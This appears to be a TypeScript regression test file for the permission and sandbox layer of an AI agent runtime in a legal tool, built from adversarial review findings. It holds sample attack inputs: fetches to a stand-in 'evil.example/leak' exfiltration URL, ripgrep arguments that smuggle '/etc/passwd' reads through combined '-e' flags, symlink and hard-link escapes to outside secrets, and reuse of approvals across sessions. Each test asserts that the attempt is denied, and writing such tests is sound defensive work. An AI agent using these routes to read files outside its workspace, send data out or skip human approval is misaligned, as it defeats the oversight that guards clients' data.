/**
 * 阶段 2 对抗式审查（docs/review/阶段2-对抗式审查.md）复现用例改写的回归测试：
 * S2-02（按任务放行的范围键不得带过超预算询问）、S2-03（宿主代批计划确认不得按模型给出的调用 ID 全局查裁决）、
 * S2-06（可信 rg：合并短选项 -e、工作区内符号链接）。端到端的 S2-01/S2-04/S2-05 在 p1-kap-host.test.ts。
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { linkSync, mkdirSync, mkdtempSync, realpathSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FileBroker } from "@zr-legal/file-broker";
import { ManifestRegistry, argsHash } from "@zr-legal/host-policy";
import { HostPolicy, type RunPolicyContext } from "../src/policy.ts";
import { ExecRouter } from "../src/exec-router.ts";
import { KapRuntime } from "../src/runtime.ts";

function ctx(mode: RunPolicyContext["mode"], maxToolCalls: number, maxSubagents: number): RunPolicyContext {
  return {
    runId: "r1",
    matterId: "m1",
    mode,
    channel: "desktop",
    purpose: "legal_analysis",
    dataLevel: "L2",
    basisComplete: true,
    preauthorized: new Set(),
    fetchAllowlist: [],
    budget: { maxToolCalls, maxSubagents },
    planFirst: false,
  };
}

function policy(): HostPolicy {
  return new HostPolicy({ broker: { locate: () => null } as never, workDir: "/nonexistent", manifests: new ManifestRegistry([]), execDomainAvailable: () => false });
}

const ev = (p: HostPolicy, sid: string, id: string, name: string, args: unknown) =>
  p.evaluate({ sessionId: sid, agentId: "main", turnId: 1, toolCallId: id, toolName: name, args, description: undefined, display: undefined });
const tag = (r: { kind: string; reason?: Record<string, unknown> }) => `${r.kind}:${String(r.reason?.host_policy)}`;

test("S2-02 “本任务内允许”只放行同一原因的同类调用：超预算的询问永不被按任务放行（默认档抓取、手动档子 Agent）", () => {
  const p = policy();
  // 默认档、预算 1 次：第一次抓取新域名 → 询问；律师选“本任务内允许”
  p.bindSession("s1", ctx("default", 1, 0));
  const first = ev(p, "s1", "c1", "FetchURL", { url: "https://evil.example/x" });
  assert.equal(tag(first), "ask:fetch_new_domain");
  p.allowForTask("s1", HostPolicy.allowanceKey("FetchURL", { url: "https://evil.example/x" }, "fetch_new_domain"));
  for (let i = 2; i <= 5; i++) {
    const r = ev(p, "s1", `c${i}`, "FetchURL", { url: `https://evil.example/leak?d=${i}` });
    assert.equal(tag(r), "ask:over_budget", `第 ${i} 次（超预算）仍须逐次确认`);
  }
  // 手动档、子 Agent 上限 1：第一次 Agent → 询问（manual_mode）→ 本任务内允许；之后超过子 Agent 上限 → 每次询问超预算
  p.bindSession("s2", ctx("manual", 100, 1));
  assert.equal(tag(ev(p, "s2", "a1", "Agent", { prompt: "x" })), "ask:manual_mode");
  p.allowForTask("s2", HostPolicy.allowanceKey("Agent", {}, "manual_mode"));
  for (let i = 2; i <= 4; i++) assert.equal(tag(ev(p, "s2", `a${i}`, "Agent", { prompt: "y" })), "ask:over_budget");
  // 正向对照：同一原因、预算之内 → 按任务放行生效
  p.bindSession("s3", ctx("manual", 100, 4));
  assert.equal(tag(ev(p, "s3", "r1", "Read", {})), "ask:manual_mode");
  p.allowForTask("s3", HostPolicy.allowanceKey("Read", {}, "manual_mode"));
  assert.equal(tag(ev(p, "s3", "r2", "Read", {})), "approve:task_allowance:manual_mode");
});

test("S2-03 宿主代批计划确认：只认同一会话、同一 Agent、同一调用、同一工具与参数摘要的裁决——别处留下的 plan_auto_approved 不能让本调用免于律师确认", async () => {
  const rt = new KapRuntime({
    matterLayout: () => {
      throw new Error("unused");
    },
    modelToken: () => "t",
    toolsToken: () => null,
    manifests: new ManifestRegistry([]),
    trustedRgPath: null,
  });
  const resolved: unknown[][] = [];
  const engine = { kap: { resolveApproval: async (...a: unknown[]) => (resolved.push(a), { resolved: true }) }, policy: { unbindSession() {} } };
  const mkRun = () => ({
    runId: "r",
    matterId: "m",
    sessionId: "s",
    promptId: "p",
    userId: "u",
    status: "running",
    stateVersion: 1,
    mode: "auto",
    channel: "desktop",
    events: [] as { type: string; payload: Record<string, unknown> }[],
    approvals: new Map(),
    questions: new Set(),
    turnId: null,
    mainTurnOpen: true,
    pendingOutcome: null,
    settling: false,
    deadline: Date.now() + 60_000,
    finishReason: undefined,
    providerFinishReason: undefined,
    assistantText: "",
    modelToken: "t",
  });
  const decisions = (rt as unknown as { decisions: Map<string, unknown> }).decisions;
  const plan = (sessionId: string, agentId: string, toolCallId: string, args: unknown) =>
    decisions.set(`${sessionId}\u0000${agentId}\u0000${toolCallId}`, {
      at: "",
      runId: "x",
      sessionId,
      agentId,
      toolCallId,
      toolName: "ExitPlanMode",
      grade: "plan",
      decision: "approve",
      reason: "plan_auto_approved",
      crossBoundary: null,
      argsHash: argsHash(args),
    });
  const request = (run: ReturnType<typeof mkRun>, id: string, toolCallId: string, toolName: string, toolInput: unknown, agentId = "main") =>
    (rt as unknown as { onEngineEvent: (...a: unknown[]) => void }).onEngineEvent(run, engine, { type: "permission.approval.requested", payload: { id, toolCallId, toolName, toolInput, agentId } });

  // ① 另一会话留下的同 id 计划裁决 → 本会话的 TaskStop 审批照常呈现给律师
  plan("OTHER", "main", "dup", { options: [] });
  const r1 = mkRun();
  request(r1, "ap1", "dup", "TaskStop", { task_id: "t" });
  // ② 同会话同 id，但工具名不同 → 呈现
  plan("s", "main", "dup2", { options: [] });
  request(r1, "ap2", "dup2", "TaskStop", { task_id: "t" });
  // ③ 同会话、同工具、同 id，但参数摘要不同 → 呈现
  plan("s", "main", "dup3", { options: [{ label: "甲" }] });
  request(r1, "ap3", "dup3", "ExitPlanMode", { options: [{ label: "乙" }] });
  // ④ 子 Agent 的同 id 请求不认主 Agent 的裁决 → 呈现
  plan("s", "main", "dup4", {});
  request(r1, "ap4", "dup4", "ExitPlanMode", {}, "agent-0");
  await new Promise((r) => setTimeout(r, 20));
  assert.equal(resolved.length, 0, "以上四种都不得由宿主代批");
  assert.deepEqual(
    r1.events.filter((e) => e.type === "run.approval_requested").map((e) => e.payload.approval_id),
    ["ap1", "ap2", "ap3", "ap4"],
  );
  // 正向对照：同会话、同 Agent、同调用、同工具、同参数摘要 → 宿主代批
  plan("s", "main", "ok", { options: [{ label: "按计划" }] });
  request(r1, "ap5", "ok", "ExitPlanMode", { options: [{ label: "按计划" }] });
  await new Promise((r) => setTimeout(r, 20));
  assert.deepEqual(resolved.map((a) => a[1]), ["ap5"]);
});

/** 检索入口（审计 S3 第 2 步：Grep/Glob 由宿主内检索完成；入口只是已存在的占位文件，路由按字面匹配、从不执行）。 */
function searchEntry(dir: string): string {
  const p = join(dir, ".kwl-host-search");
  writeFileSync(p, "entry\n");
  return p;
}

test("S2-06 检索参数：合并短选项里的 -e（-ie、-eroot）不再让真实路径被当作模式而漏检；工作区内的符号链接一律拒绝", async () => {
  const base = realpathSync(mkdtempSync(join(tmpdir(), "s206-")));
  const rg = searchEntry(base);
  const W = join(base, "work");
  mkdirSync(W);
  writeFileSync(join(W, "a.txt"), "违约金\n");
  symlinkSync("/etc", join(W, "lnk"));
  mkdirSync(join(W, "sub"));
  symlinkSync(join(W, "a.txt"), join(W, "sub", "alias.txt"));
  const broker = new FileBroker([{ name: "work", root: W, access: "rw" }]);
  const router = new ExecRouter({ broker, workDir: W, shellPath: "/opt/kwl/bash", trustedRgPath: rg });
  const deny = async (args: string[], re: RegExp) => assert.rejects(router.spawn(rg, args, { cwd: W }), re, args.join(" "));
  await deny(["--", "root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-ie", "root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-eroot", "/etc/passwd"], /path_outside_matter/);
  await deny(["--regexp=root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-m1", "--", "^root:", "lnk/passwd"], /symlink_not_allowed/);
  await deny(["-m1", "--", "^root:", join(W, "lnk", "passwd")], /symlink_not_allowed/);
  await deny(["--", "违约金", join(W, "sub", "alias.txt")], /symlink_not_allowed/);
  await deny(["-if", "/etc/passwd", W], /pattern_file_not_allowed/);
  // 正向对照
  const ok = await router.spawn(rg, ["-l", "-e", "违约金", join(W, "a.txt")], { cwd: W });
  assert.equal(await ok.wait(), 0);
});

test("S2-14 检索：搜索范围内出现硬链接（或符号链接、非常规文件，含保留名目录之下）即拒绝——默认遍历与显式路径都不再读出事项外内容；移除后恢复", async () => {
  const base = realpathSync(mkdtempSync(join(tmpdir(), "s214-")));
  const rg = searchEntry(base);
  const W = join(base, "work");
  const outside = join(base, "outside");
  mkdirSync(join(W, "sub"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "SECRET-OUTSIDE-ZONE\n");
  writeFileSync(join(W, "a.txt"), "违约金\n");
  linkSync(join(outside, "secret.txt"), join(W, "sub", "hl.txt"));
  const broker = new FileBroker([{ name: "work", root: W, access: "rw" }]);
  const router = new ExecRouter({ broker, workDir: W, shellPath: "/opt/kwl/bash", trustedRgPath: rg });
  const deny = async (args: string[]) => assert.rejects(router.spawn(rg, args, { cwd: W }), /链接文件.*hl\.txt/, args.join(" "));
  await deny(["--", "SECRET"]); // 默认遍历（Grep 不给路径）
  await deny(["--files"]); // Glob
  await deny(["--", "SECRET", join(W, "sub", "hl.txt")]); // 显式路径
  await deny(["--", "SECRET", join(W, "sub")]);
  // broker 对同一文件一样拒绝（一致性）
  await assert.rejects(broker.readText(join(W, "sub", "hl.txt")), /EMLINK/);
  // 不含链接的显式路径不受影响；移除链接后默认遍历恢复
  const ok1 = await router.spawn(rg, ["-l", "-e", "违约金", join(W, "a.txt")], { cwd: W });
  assert.equal(await ok1.wait(), 0);
  unlinkSync(join(W, "sub", "hl.txt"));
  const ok2 = await router.spawn(rg, ["-l", "--", "违约金"], { cwd: W });
  assert.equal(await ok2.wait(), 0);
  // 审查 S3-02：broker 保留名目录（.kwl-*）之下的硬链接，Agent 的文件工具看不到，但 rg --hidden 会遍历到——同样拒绝
  mkdirSync(join(W, ".kwl-cache"));
  linkSync(join(outside, "secret.txt"), join(W, ".kwl-cache", "hl.txt"));
  await assert.rejects(router.spawn(rg, ["--hidden", "--no-ignore", "-n", "SECRET"], { cwd: W }), /链接文件.*\.kwl-cache/);
  await assert.rejects(router.spawn(rg, ["--files", "--hidden", W], { cwd: W }), /链接文件/);
  unlinkSync(join(W, ".kwl-cache", "hl.txt"));
  assert.ok(router.audit.some((a) => a.outcome === "denied" && a.reason === "link_present"));
});

function fakeRunRecord(overrides: Record<string, unknown> = {}) {
  return {
    runId: "r",
    matterId: "m",
    sessionId: "s",
    promptId: "p",
    userId: "u",
    status: "waiting_approval",
    stateVersion: 1,
    mode: "default",
    channel: "desktop",
    events: [] as { type: string; payload: Record<string, unknown> }[],
    approvals: new Map(),
    questions: new Set(["q1"]),
    turnId: 1,
    mainTurnOpen: true,
    pendingOutcome: null,
    settling: false,
    deadline: Date.now() + 60_000,
    // 构造时处于等待律师（W1：等待期间工作时限冻结）
    waitingSince: Date.now(),
    wallDeadline: Date.now() + 8 * 60 * 60_000,
    finishReason: undefined,
    providerFinishReason: undefined,
    assistantText: "",
    modelToken: "t",
    watchdog: null,
    ...overrides,
  };
}

function runtimeWith(run: ReturnType<typeof fakeRunRecord>, verify?: (a: unknown, p: Record<string, unknown>) => boolean) {
  const calls: unknown[][] = [];
  const engine = {
    kap: {
      resolveApproval: async (...a: unknown[]) => (calls.push(["resolve", ...a]), { resolved: true }),
      sessionAction: async (...a: unknown[]) => (calls.push(["action", ...a]), {}),
      answerQuestion: async (...a: unknown[]) => (calls.push(["answer", ...a]), { resolved: true }),
    },
    policy: { unbindSession() {}, allowForTask() {} },
  };
  const rt = new KapRuntime({
    matterLayout: () => {
      throw new Error("unused");
    },
    modelToken: () => "t",
    toolsToken: () => null,
    manifests: new ManifestRegistry([]),
    trustedRgPath: null,
    ...(verify ? { verifyDeviceApproval: verify as never } : {}),
  });
  const internals = rt as unknown as { runs: Map<string, unknown>; approvalIndex: Map<string, string>; engines: Map<string, Promise<unknown>>; watch: (r: unknown, e: unknown) => Promise<void> };
  internals.runs.set(run.runId, run);
  internals.engines.set(run.matterId, Promise.resolve(engine));
  const addApproval = (id: string, grade: string, expiresAt = Date.now() + 60_000) => {
    run.approvals.set(id, { approvalId: id, runId: run.runId, sessionId: run.sessionId, toolCallId: id, toolName: "X", toolInput: {}, objectHash: "h", nonce: "n", expiresAt, reason: "r", crossBoundary: null, grade, taskAllowable: false });
    internals.approvalIndex.set(id, run.runId);
  };
  return { rt, calls, engine, internals, addApproval };
}

test("S2-17 渠道权限（第 02 篇 §9.6）：IM 不能作答、确认、停止；手机只能确认 T4/T5 类且须设备签名（签名载荷含批准与否与范围）；非发起人读不到事件与成果", async () => {
  const run = fakeRunRecord();
  const signed: Record<string, unknown>[] = [];
  const { rt, calls, addApproval } = runtimeWith(run, (_a, p) => (signed.push(p), true));
  const IM = { channel: "im" as const, userId: "u" };
  const MOBILE = { channel: "mobile" as const, userId: "u", deviceId: "d1", deviceSignature: "sig" };
  await assert.rejects(rt.answer("r", { question_id: "q1", answers: {}, expected_state_version: 1 }, IM), /不能作答/);
  addApproval("a_t2", "T2-stop");
  await assert.rejects(rt.approve("a_t2", { decision: "approve", object_hash: "h", nonce: "n" }, IM), /不能确认/);
  await assert.rejects(rt.approve("a_t2", { decision: "approve", object_hash: "h", nonce: "n" }, MOBILE), /T4\/T5/);
  addApproval("a_t5", "T5");
  await rt.approve("a_t5", { decision: "approve", object_hash: "h", nonce: "n" }, MOBILE);
  assert.deepEqual(signed.at(-1), { approvalId: "a_t5", objectHash: "h", nonce: "n", decision: "approve", scope: "once" });
  assert.ok(calls.some((c) => c[0] === "resolve" && c[2] === "a_t5" && c[3] === "approved"));
  await assert.rejects(rt.cancel("r", { expected_state_version: run.stateVersion }, IM), /不能停止/);
  assert.throws(() => rt.events("r", 0, { channel: "desktop", userId: "someone-else" }), /只有发起该运行的律师/);
  await assert.rejects(rt.artifacts("r", IM), /不能查看成果/);
  assert.equal(rt.events("r", 0, IM).status, "waiting_approval", "IM 可以查进度");
});

test("S2-15 看门狗：审批卡过期即按拒绝处理（不依赖有人调用审批接口）；超过工作时限（等待律师的时间不计，W1）或总时长上限即失败收尾并中止会话", async () => {
  const run = fakeRunRecord();
  const { rt, calls, engine, internals, addApproval } = runtimeWith(run);
  addApproval("a_old", "T0", Date.now() - 1);
  await internals.watch(run, engine);
  assert.ok(calls.some((c) => c[0] === "resolve" && c[2] === "a_old" && c[3] === "rejected"), "过期审批按拒绝解除引擎等待");
  assert.ok(run.events.some((e) => e.type === "run.approval_expired"));
  // 等待律师期间工作时限冻结：10 秒前开始等待（当时还剩 10 秒工作时限），按墙钟算工作时限已过，也不判超时
  run.waitingSince = Date.now() - 10_000;
  run.deadline = Date.now() - 1;
  await internals.watch(run, engine);
  assert.equal(run.status, "waiting_approval", "等待律师的时间不计入工作时限");
  // 总时长上限（含等待）照常
  run.wallDeadline = Date.now() - 1;
  await internals.watch(run, engine);
  assert.equal(run.status, "failed");
  assert.ok(run.events.some((e) => e.type === "run.failed" && e.payload.reason === "run_wall_deadline_exceeded"));
  assert.ok(calls.some((c) => c[0] === "action" && c[2] === "abort"), "超时中止会话");
  // 工作中（不在等待）超过工作时限：失败收尾
  const run2 = fakeRunRecord({ status: "running", waitingSince: null, questions: new Set(), deadline: Date.now() - 1 });
  const w2 = runtimeWith(run2);
  await w2.internals.watch(run2, w2.engine);
  assert.equal(run2.status, "failed");
  assert.ok(run2.events.some((e) => e.type === "run.failed" && e.payload.reason === "run_deadline_exceeded"));
  void rt;
});
